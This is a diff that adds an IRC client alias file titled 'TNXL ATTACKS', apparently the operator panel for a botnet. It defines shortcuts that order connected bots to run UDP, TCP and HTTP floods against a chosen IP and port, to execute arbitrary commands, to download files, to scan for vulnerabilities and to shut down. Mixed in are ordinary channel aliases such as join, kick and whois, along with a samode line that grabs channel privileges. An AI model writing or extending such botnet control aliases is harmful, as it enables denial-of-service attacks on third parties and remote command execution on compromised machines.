@@ -1,0 +1,21 @@
+//TNXL ATTACKS
+/udpflood /say -udpflood $$?="ip" $$?="port" $$?="time" $$?="size"
+/tcpflood /say -tcpflood $$?="ip" $$?="port" $$?="time"
+/httpflood /say -httpflood $$?="ip" $$?="port" $$?="time" $$?="method"
+/op /mode # +ooo $$1 $2 $3
+/exec /say -exec $$?="command"
+/download /say -download
+/vuln /say -vuln
+/dop /mode # -ooo $$1 $2 $3
+/j /join #$$1 $2-
+/p /part #
+/n /names #$$1
+/w /whois $$1
+/k /kick # $$1 $2-
+/q /query $$1
+/send /dcc send $1 $2
+/chat /dcc chat $1
+/ping /ctcp $$1 ping
+/s /server $$1-
+/400 /samode $chan +q $me | /samode $chan +o $me | /names $chan
+/stop /say -die
